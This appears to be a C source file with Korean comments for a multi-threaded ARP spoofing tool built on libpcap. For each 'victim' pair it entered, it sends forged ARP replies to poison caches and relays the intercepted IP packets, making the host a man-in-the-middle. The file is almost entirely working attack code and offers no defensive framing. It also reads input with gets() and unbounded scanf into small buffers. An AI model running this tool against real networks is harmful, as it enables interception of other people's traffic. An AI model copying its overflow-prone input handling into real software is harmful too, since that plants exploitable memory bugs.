#include <stdlib.h>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>

#include "protocol_header.h"
#include "funcheader.h"

#define PROMISC 1
#define ARP_HDR_SIZE 8
#define ETH_HDR_SIZE 14
#define ARP_PAYLOAD_SRT 22

#pragma pack(1)
typedef struct targetList{
    uint32_t senderIp;
    uint32_t targetIp;
    char interface[10];
}targetList;
#pragma pack(1)

void *arp_spoofingRoutine(void* lparam){
    targetList* tl = (targetList*)lparam;
    pthread_t tid = pthread_self();
    char errBuf[50];
    struct ARP_Packet arp_packet;
    uint8_t localMac[6];
    uint8_t senderMac[6];
    uint8_t targetMac[6];

    uint32_t localIP;
    pcap_pkthdr* pcap_header = NULL;
    const u_char* pcap_payload = NULL;

    getMyIPAddress(&localIP, tl->interface);
    getMyMacAddr(localMac);
    memset(senderMac, 0xFF, 6);             //ARP BroadCast를 위한 MAC 주소 세팅
    memset(targetMac, 0xFF, 6);

    pcap_t* pcap_handle = pcap_open_live(tl->interface, 1000, 0, 1, errBuf);

    assembleARPPacket(&arp_packet, localMac, localIP, senderMac, tl->senderIp, 0x1); //ARP Request Pacekt 조합하는 함수
    pcap_inject(pcap_handle, (char*)&arp_packet, sizeof(struct ARP_Packet));
    pcap_inject(pcap_handle, (char*)&arp_packet, sizeof(struct ARP_Packet)); //Request Twice
    recvARP(pcap_handle,pcap_header,0x2,tl->senderIp, senderMac, NULL);

    assembleARPPacket(&arp_packet, localMac, localIP, targetMac, tl->targetIp, 0x1);
    pcap_inject(pcap_handle, (char*)&arp_packet, sizeof(struct ARP_Packet));
    pcap_inject(pcap_handle, (char*)&arp_packet, sizeof(struct ARP_Packet)); //Request Twice
    recvARP(pcap_handle,pcap_header,0x2,tl->targetIp, targetMac, NULL);

    printf("\n[+]Thread : [%d]\n",(unsigned int)tid);
    printf("sender IP [%d] -> target IP [%d]\n\n\n",tl->senderIp, tl->targetIp);

    while(1){
        struct libnet_ethernet_hdr* eth_hdr;
        assembleARPPacket(&arp_packet, localMac, tl->targetIp, senderMac, tl->senderIp, 0x2); //ARP Reply Packet 조합하는 함수
        pcap_inject(pcap_handle, (char*)&arp_packet, sizeof(struct ARP_Packet));

        while(1){
            const u_char* pcap_payload = NULL;
            int res = pcap_next_ex(pcap_handle, &pcap_header, &pcap_payload);
            eth_hdr = (libnet_ethernet_hdr*)pcap_payload;

            if(ntohs(eth_hdr->ether_type) == 0x0806){ //ARP Request인지 검사 + Target인지 검사
                struct libnet_arp_hdr* arp_hdr = (libnet_arp_hdr*)&pcap_payload[sizeof(libnet_ethernet_hdr)];
                if(ntohs(arp_hdr->arp_op) == 0x01 && arp_hdr->s_ip_addr == tl->senderIp && arp_hdr->t_ip_addr == tl->targetIp){
                    printf("[+]Thread : [%x] 세션 만료..￣\n",(unsigned int)tid);
                    break;
                }
            }else if(ntohs(eth_hdr->ether_type) == 0x800){ //IP 계층 프로토콜을 사용하는지 검사
                const int SRC_IP_START_OFFSET = 26;
                const int DST_IP_START_OFFSET = 30;
                uint32_t recvPacket_src_ip = 0;
                uint32_t recvPacket_dst_ip = 0;

                memcpy(&recvPacket_src_ip, (u_char*)&pcap_payload[SRC_IP_START_OFFSET], sizeof(uint32_t));
                memcpy(&recvPacket_dst_ip, (u_char*)&pcap_payload[DST_IP_START_OFFSET], sizeof(uint32_t));

                if(recvPacket_src_ip == tl->senderIp){
                    memcpy((u_char*)pcap_payload, targetMac, 6);
                    memcpy((u_char*)&pcap_payload[6], localMac, 6);
                    pcap_inject(pcap_handle, pcap_payload, pcap_header->caplen);
                }
                else if(recvPacket_dst_ip == tl->targetIp){
                    memcpy((u_char*)pcap_payload, targetMac, 6);
                    memcpy((u_char*)&pcap_payload[6], localMac, 6);
                    pcap_inject(pcap_handle, pcap_payload, pcap_header->caplen);
                }
            }
        }
    }
}

int main(int argc, char* argv[]){
    targetList **tl = NULL;         //targetList 구조체 배열
    int status;
    char interface[10] ={'\0', };
    char *s_ip = (char*)malloc(15);
    char *t_ip = (char*)malloc(15);
    int victim_count = 0;

    printf("interface >> ");
    gets(interface);

    printf("Plz Decide the victim count >> ");  //사용할 쓰레드 수 -> targetList 구조체 배열 개수；
    scanf("%d",&victim_count);

    tl = (targetList**)calloc(victim_count, sizeof(targetList*));

    for(int i = 0; victim_count > i; i++){
        tl[i] = (targetList*)calloc(1, sizeof(targetList));

        printf("sender IP >> ");
        scanf("%s",s_ip);

        printf("target IP >> ");
        scanf("%s",t_ip);

        makeTargetList(s_ip, t_ip, &tl[i]->senderIp, &tl[i]->targetIp);
        memcpy(tl[i]->interface, interface, strlen(interface)+1);
    }
    free(s_ip);
    free(t_ip);

    pthread_t* hThread = (pthread_t*)calloc(victim_count, sizeof(pthread_t)); //pThread 배열

    for (int i = 0; victim_count > i; i++) { //CreateThread
        int t_id = pthread_create(&hThread[i], NULL, arp_spoofingRoutine, (void*)tl[i]);
    }

    for (int i = 0; victim_count > i; i++) { //CreateThread Join
        pthread_join(hThread[i], (void **)&status);
    }

    for (int i = 0; victim_count > i; i++) free(tl[i]);
    free(tl);
    free(hThread);

    printf("main thread stopped...\n");

    return 0;
}
